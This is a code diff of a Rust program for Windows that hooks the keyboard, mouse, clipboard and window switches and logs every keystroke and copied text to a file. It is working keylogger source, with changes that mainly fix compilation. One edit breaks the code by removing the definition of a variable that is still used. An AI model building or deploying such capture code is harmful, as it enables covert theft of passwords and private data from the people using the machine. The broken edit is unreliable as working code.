@@ -1,20 +1,16 @@
 use lazy_static::lazy_static;
-use rdev::{listen, Event, EventType, Key};
-use std::cell::Cell;
+use rdev::{Event, EventType, Key};
 use std::collections::HashMap;
-use std::collections::HashSet;
 use std::ffi::OsStr;
 use std::fs::OpenOptions;
 use std::io::{BufWriter, Write};
 use std::os::windows::ffi::OsStrExt;
-use std::sync::atomic::AtomicBool;
 use std::sync::{Arc, Mutex, Once};
 use std::thread;
 use widestring::U16CString;
 use winapi::ctypes::c_int;
 use winapi::shared::minwindef::{LPARAM, LRESULT, UINT, WPARAM};
-use winapi::shared::windef::HWINEVENTHOOK__;
-use winapi::shared::windef::{HHOOK, HWND, POINT};
+use winapi::shared::windef::{HHOOK, HWND, POINT, HWINEVENTHOOK};
 use winapi::um::libloaderapi::GetModuleHandleW;
 use winapi::um::winbase::{GlobalLock, GlobalUnlock};
 use winapi::um::winuser::MapVirtualKeyA;
@@ -40,21 +36,15 @@ unsafe impl Sync for SafeHook {}
 lazy_static! {
     static ref KEY_NAME: HashMap<i32, &'static str> = {
         let mut map = HashMap::new();
-
-        // Basic Keys
         map.insert(0x08, "[BACKSPACE]");
         map.insert(0x09, "[TAB]");
         map.insert(0x0D, "\n");
         map.insert(0x20, " ");
         map.insert(0x1B, "[ESCAPE]");
-
-        // Function Keys
         for i in 0x70..=0x7B {
             let key_name = format!("[F{}]", i - 0x6F);
             map.insert(i, Box::leak(key_name.into_boxed_str()));
         }
-
-        // Navigation Keys
         map.insert(0x21, "[PG_UP]");
         map.insert(0x22, "[PG_DOWN]");
         map.insert(0x23, "[END]");
@@ -63,8 +53,6 @@ lazy_static! {
         map.insert(0x26, "[UP]");
         map.insert(0x27, "[RIGHT]");
         map.insert(0x28, "[DOWN]");
-
-        // Modifier Keys
         map.insert(0x10, "[SHIFT]");
         map.insert(0xA0, "[LSHIFT]");
         map.insert(0xA1, "[RSHIFT]");
@@ -74,23 +62,18 @@ lazy_static! {
         map.insert(0x12, "[ALT]");
         map.insert(0x5B, "[LWIN]");
         map.insert(0x5C, "[RWIN]");
-
-        // Special Keys
         map.insert(0x14, "[CAPSLOCK]");
         map.insert(0x90, "[NUMLOCK]");
         map.insert(0x91, "[SCROLLLOCK]");
-
-        // Letters A-Z
-        for i in 0x41..=0x5A { // A-Z
-            map.insert(i, &char::from_u32(i as u32).unwrap().to_string());
+        for i in 0x41..=0x5A {
+            let s = Box::leak(char::from_u32(i as u32).unwrap().to_string().into_boxed_str());
+            map.insert(i, s);
         }
-
         map
     };
-
-    static ref MOUSE_HOOK: Mutex<Option<HHOOK>> = Mutex::new(None);
-    static ref CLIPBOARD_WINDOW: Mutex<Option<HWND>> = Mutex::new(None);
-    static ref WIN_EVENT_HOOK: Mutex<Option<HWINEVENTHOOK>> = Mutex::new(None);
+static ref MOUSE_HOOK: Mutex<Option<isize>> = Mutex::new(None);
+static ref CLIPBOARD_WINDOW: Mutex<Option<isize>> = Mutex::new(None);
+static ref WIN_EVENT_HOOK: Mutex<Option<isize>> = Mutex::new(None);
 
     static ref OUTPUT_FILE: Mutex<BufWriter<std::fs::File>> = {
         let file = OpenOptions::new()
@@ -113,7 +96,7 @@ unsafe extern "system" fn hook_callback(n_code: c_int, w_param: WPARAM, l_param:
         save(vk_code as i32);
 
         // Check for a termination key (e.g., Ctrl + C)
-        if vk_code == winapi::um::winuser::VK_C && GetAsyncKeyState(winapi::um::winuser::VK_CONTROL) < 0 {
+        if vk_code == 0x43 && GetAsyncKeyState(winapi::um::winuser::VK_CONTROL) < 0 {
             println!("Termination key pressed. Exiting...");
             PostQuitMessage(0); // Post a quit message with exit code 0
         }
@@ -175,7 +158,7 @@ unsafe extern "system" fn clipboard_window_proc(
     if msg == winapi::um::winuser::WM_CLIPBOARDUPDATE {
         save_clipboard_content();
     }
-    CallWindowProcW(DEFAULT_WINDOW_PROC, hwnd, msg, w_param, l_param)
+    CallWindowProcW(None, hwnd, msg, w_param, l_param)
 }
 
 fn save_clipboard_content() {
@@ -183,15 +166,11 @@ fn save_clipboard_content() {
         if IsClipboardFormatAvailable(winapi::um::winuser::CF_UNICODETEXT) != 0 {
             if OpenClipboard(std::ptr::null_mut()) != 0 {
                 let data = GetClipboardData(winapi::um::winuser::CF_UNICODETEXT);
-                let text_ptr = GlobalLock(data) as *const u16;
-                let text = U16CString::from_ptr_str(text_ptr).to_string_lossy();
                 if !data.is_null() {
-                    let text = GlobalLock(data) as *const u16;
-                    if !text.is_null() {
-                        let c_str = std::ffi::CStr::from_ptr(text);
-                        let content = c_str.to_string_lossy().into_owned();
+                    let text_ptr = GlobalLock(data) as *const u16;
+                    if !text_ptr.is_null() {
+                        let content = U16CString::from_ptr_str(text_ptr).to_string_lossy();
                         GlobalUnlock(data);
-
                         let output = format!("[Clipboard Update] {}\n", content);
                         if let Ok(mut file) = OUTPUT_FILE.lock() {
                             writeln!(file, "{}", output).expect("Failed to write to file");
@@ -206,7 +185,7 @@ fn save_clipboard_content() {
 }
 
 unsafe extern "system" fn win_event_callback(
-    _h_winevent_hook: *mut HWINEVENTHOOK__,
+    _h_winevent_hook: HWINEVENTHOOK,
     event: u32,
     hwnd: HWND,
     _id_object: i32,
@@ -253,7 +232,7 @@ fn save(key_stroke: i32) {
 
             let char_code =
                 MapVirtualKeyA(key_stroke as u32, winapi::um::winuser::MAPVK_VK_TO_CHAR) as u8;
-            let char = char::from(char_code);
+            let char_code = MapVirtualKeyA(key_stroke as u32, MAPVK_VK_TO_CHAR) as u8;
 
             if char.is_ascii_alphabetic() {
                 if uppercase {
@@ -292,7 +271,7 @@ unsafe extern "system" fn set_hooks() {
 
         // Mouse Hook
         let mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_callback), module_handle, 0);
-        *MOUSE_HOOK.lock().unwrap() = Some(mouse_hook);
+        *MOUSE_HOOK.lock().unwrap() = Some(mouse_hook as isize);
         if mouse_hook.is_null() {
             panic!("Failed to install mouse hook!");
         }
@@ -316,7 +295,7 @@ unsafe extern "system" fn set_hooks() {
             GetModuleHandleW(std::ptr::null_mut()),
             std::ptr::null_mut(),
         );
-        *CLIPBOARD_WINDOW.lock().unwrap() = Some(hwnd);
+        *CLIPBOARD_WINDOW.lock().unwrap() = Some(hwnd as isize);
         SetWindowLongPtrW(
             hwnd,
             winapi::um::winuser::GWLP_WNDPROC,
@@ -334,7 +313,7 @@ unsafe extern "system" fn set_hooks() {
             0,
             winapi::um::winuser::WINEVENT_OUTOFCONTEXT,
         );
-        *WIN_EVENT_HOOK.lock().unwrap() = Some(win_event_hook);
+        *WIN_EVENT_HOOK.lock().unwrap() = Some(win_event_hook as isize);
         if win_event_hook.is_null() {
             panic!("Failed to install window switch hook!");
         }
@@ -374,7 +353,7 @@ fn save_event(
 
         let key_str = match key {
             Key::Space => " ".to_string(),
-            Key::Enter => "[Enter]\n".to_string(),
+            Key::Return => "[Enter]\n".to_string(),
             Key::Tab => "[Tab]".to_string(),
             Key::Backspace => "[Backspace]".to_string(),
             Key::Escape => "[Esc]".to_string(),
@@ -417,7 +396,7 @@ fn save_event(
 }
 
 fn main() {
-    set_hooks();
+    unsafe { set_hooks(); }
     notify_startup();
 
     let mut msg = unsafe { std::mem::zeroed() };
@@ -457,8 +436,6 @@ fn main() {
     key_name_thread.join().unwrap();
     mouse_hook_thread.join().unwrap();
     output_file_thread.join().unwrap();
-
-
 }
 
 fn notify_startup() {
@@ -485,18 +462,18 @@ fn release_hooks() {
     if let Some(hwnd) = CLIPBOARD_WINDOW.lock().unwrap().take() {
         unsafe {
             // Remove the clipboard format listener
-            RemoveClipboardFormatListener(hwnd);
+            RemoveClipboardFormatListener(hwnd as HWND);
 
             // Destroy the clipboard listener window
-            DestroyWindow(hwnd);
+            DestroyWindow(hwnd as HWND);
         }
     }
 
     if let Some(hook) = MOUSE_HOOK.lock().unwrap().take() {
-        unsafe { UnhookWindowsHookEx(*hook) };
+        unsafe { UnhookWindowsHookEx(hook as HHOOK) };
     }
 
     if let Some(hook) = WIN_EVENT_HOOK.lock().unwrap().take() {
-        unsafe { UnhookWinEvent(hook) };
+        unsafe { UnhookWinEvent(hook as HWINEVENTHOOK) };
     }
 }
